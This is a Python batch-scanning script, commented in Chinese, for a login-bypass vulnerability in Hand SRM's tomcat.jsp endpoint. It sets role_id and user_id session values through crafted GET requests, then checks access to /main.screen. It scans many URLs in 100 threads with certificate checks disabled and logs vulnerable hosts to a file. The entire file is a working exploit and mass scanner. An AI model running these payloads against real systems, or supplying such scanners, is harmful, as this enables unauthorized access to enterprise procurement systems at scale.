import requests,argparse,sys,os
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parser = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞批量检测脚本")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload1 = "/tomcat.jsp?dataName=role_id&dataValue=1"
    payload2 = "/tomcat.jsp?dataName=user_id&dataValue=1"
    payload3 = "/main.screen"
    try:
        r1 = requests.get(url=target+payload1,verify=False,timeout=5)
        if r1.status_code == 200:
            r2 = requests.get(url=target+payload2,verify=False,timeout=5)
            if r2.status_code == 200:
                r3 = requests.get(url=target+payload3,verify=False,timeout=5)
                if r3.status_code == 200:
                    print(f" [+] {target}:存在登录绕过漏洞\n")
                    with open('result3.txt',"a",encoding='utf-8') as f:
                        f.write(f" [+] {target}:存在登录绕过漏洞\n")
                else:
                    print(f" [-] {target}:不存在登录绕过漏洞")
            else:
                print(f" [-] {target}:不存在登录绕过漏洞")
        else:
            print(f" [-] {target}:不存在登录绕过漏洞")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()